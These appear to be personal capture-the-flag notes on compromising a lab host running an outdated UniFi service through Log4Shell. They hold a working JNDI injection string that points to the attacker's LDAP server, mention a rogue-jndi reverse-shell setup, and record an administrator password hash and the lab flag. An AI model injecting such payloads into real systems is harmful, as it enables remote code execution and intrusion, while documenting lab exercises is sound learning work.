# {{10.129.247.157}}
## Enumeration
#### [[nmap]]
-`22/tcp   open  ssh`
-`6789/tcp open  ibm-db2-admin`
-`8080/tcp open  http-proxy`
-`8443/tcp open  https-alt`
-`8880/tcp open  cddbp-alt`



#### notes
- ssh, possibility for shell
- http proxy shows unifi running with a outdaded version
- unifi has [[log4j vuln]]
- we watch port [[ldap]] port (389) to see if log4shell works
- i used [[nc]] for this
- the jndi request looks like `${jndi:ldap://10.10.15.131:1389/o=tomcat}`


## Exploitation
#### notes
- i used insalled java, marven and rogue-jndi to build my rouge ldap server
- we then setup the server to have a revese shell script
- using the article we know the server should have mongoDB
- we found administrator: x shadow =
- $6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.



### finnally
user flag: 6ced1a6a89e666c0620cdb10262ba127